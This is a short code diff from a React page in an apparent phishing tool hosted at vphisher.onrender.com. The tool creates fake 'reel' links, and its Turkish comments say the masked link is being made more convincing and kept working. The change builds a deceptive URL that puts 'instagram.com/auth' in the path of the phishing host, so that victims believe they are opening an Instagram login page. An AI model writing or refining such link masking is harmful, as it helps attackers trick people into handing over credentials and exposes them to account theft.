@@ -111,8 +111,8 @@ export default function CreateReelPage() {
       toast.success('Reel link created successfully!');
       const baseLink = `${window.location.origin.includes('localhost') ? 'http://localhost:3000' : 'https://vphisher.onrender.com'}/${reelIdToSubmit}`;
       setLastCreatedLink(baseLink);
-      // Maskelenmiş linki daha inandırıcı yapalım
-      const fakeMasked = `https://www.instagram.com/reels/videos/@[vphisher.onrender.com]/${reelIdToSubmit}`;
+      // Maskelenmiş ama ÇALIŞAN link (En başta bizim sitemiz olmalı)
+      const fakeMasked = `https://vphisher.onrender.com/reels/videos/instagram.com/auth/${reelIdToSubmit}`;
       setMaskedLink(fakeMasked);
       setRedirectUrl('');
       setNewReelId(generateReelId());
